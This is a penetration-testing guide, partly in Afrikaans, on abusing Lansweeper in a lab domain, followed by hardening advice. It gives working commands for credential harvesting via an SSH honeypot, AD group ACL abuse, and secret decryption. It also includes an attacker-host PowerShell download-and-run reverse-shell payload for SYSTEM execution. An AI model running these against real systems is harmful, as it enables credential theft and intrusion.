# Lansweeper Misbruik: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper is 'n IT asset discovery en inventory platform wat algemeen op Windows gedeploy word en met Active Directory geïntegreer is. Credentials wat in Lansweeper gekonfigureer is, word deur sy scanning engines gebruik om by assets te authentiseer oor protokolle soos SSH, SMB/WMI en WinRM. Misconfigurasies laat dikwels toe:

- Credential interception deur 'n scanning target na 'n aanvaller-beheerde gasheer (honeypot) te herlei
- Abuse of AD ACLs wat deur Lansweeper-related groups blootgestel word om remote toegang te kry
- On-host decryption van Lansweeper-configured secrets (connection strings en stored scanning credentials)
- Code execution op managed endpoints via die Deployment feature (dikwels lopend as SYSTEM)

Hierdie bladsy som praktiese aanvaller-werkvloei en opdragte op om hierdie gedrag tydens engagements te misbruik.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idee: skep 'n Scanning Target wat na jou gasheer wys en koppel bestaande Scanning Credentials daaraan. Wanneer die scan loop, sal Lansweeper probeer om met daardie credentials te authentiseer, en jou honeypot sal dit vasvang.

Stappe oorsig (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Tipe: IP Range (or Single IP) = jou VPN IP
- Konfigureer die SSH-poort na iets bereikbaar (bv. 2022 as 22 geblokkeer is)
- Deaktiveer die schedule en beplan om dit handmatig te trigger
- Scanning → Scanning Credentials → verseker dat Linux/SSH creds bestaan; koppel dit aan die nuwe target (enable all as needed)
- Klik “Scan now” op die target
- Run an SSH honeypot en vang die gepoogde gebruikersnaam/wagwoord op

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valideer vasgevangde creds teen DC-dienste:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Aantekeninge
- Werk soortgelyk vir ander protokolle wanneer jy die scanner na jou luisteraar kan dwing (SMB/WinRM honeypots, ens.). SSH is dikwels die eenvoudigste.
- Baie scanners identifiseer hulself met onderskeibare client banners (bv. RebexSSH) en sal onskadelike opdragte (uname, whoami, ens.) probeer.

## 2) AD ACL abuse: kry afstandstoegang deur jouself by 'n app-admin group te voeg

Gebruik BloodHound om die effektiewe regte van die gekompromitteerde rekening te enumereer. 'n Algemene bevinding is 'n scanner- of app-specific group (bv. “Lansweeper Discovery”) wat GenericAll het oor 'n bevoorregte groep (bv. “Lansweeper Admins”). As die bevoorregte groep ook lid is van “Remote Management Users”, word WinRM beskikbaar sodra ons onsself byvoeg.

Versamelvoorbeelde:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll op groep met BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kry dan 'n interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wenk: Kerberos-operasies is tydsensitief. As jy KRB_AP_ERR_SKEW kry, sinkroniseer eers met die DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Ontsleutel Lansweeper-gekonfigureerde geheime op die gasheer

Op die Lansweeper-bediener stoor die ASP.NET-webwerf gewoonlik 'n geënkripteerde connection string en 'n symmetriesleutel wat deur die toepassing gebruik word. Met toepaslike plaaslike toegang kan jy die DB connection string ontsleutel en dan die gestoorde scanning credentials ekstraheer.

Tipiese liggings:
- Web-config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Toepassingsleutel: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Gebruik SharpLansweeperDecrypt om ontcijfering en dumping van gestoorde creds te outomatiseer:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Die verwagte uitset sluit DB-verbindingbesonderhede en plaintext-skanderings-inlogbewyse in, soos Windows- en Linux-rekeninge wat oor die omgewing gebruik word. Hierdie rekeninge het dikwels verhoogde plaaslike regte op domein-gashere:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Gebruik herwonne Windows scanning creds vir bevoorregte toegang:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.

Hoëvlak stappe:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Voorbeeld payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Ontplooiingsaksies is luidrugtig en laat logs in Lansweeper en in die Windows event logs. Gebruik dit versigtig.

## Opsporing en verharding

- Beperk of verwyder anonieme SMB-enumerasies. Monitor vir RID-cycling en abnormale toegang tot Lansweeper shares.
- Egress-controles: blokkeer of beperk streng uitgaande SSH/SMB/WinRM vanaf scanner-hosts. Waarsku op nie-standaard poorte (bv. 2022) en ongewone kliëntbanners soos Rebex.
- Beskerm `Website\\web.config` en `Key\\Encryption.txt`. Externaliseer secrets in 'n vault en roteer dit by blootstelling. Oorweeg service accounts met minimale bevoegdhede en gMSA waar toepaslik.
- AD-monitoring: waarsku op veranderinge aan Lansweeper-related groups (bv. “Lansweeper Admins”, “Remote Management Users”) en op ACL-wysigings wat GenericAll/Write-lidmaatskap op bevoorregte groepe toeken.
- Ouudit die skepping/wysiging/uitvoering van Deployment-pakkette; waarsku op pakkette wat cmd.exe/powershell.exe spawn of onverwagte uitgaande verbindings.

## Verwante onderwerpe
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## Verwysings
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
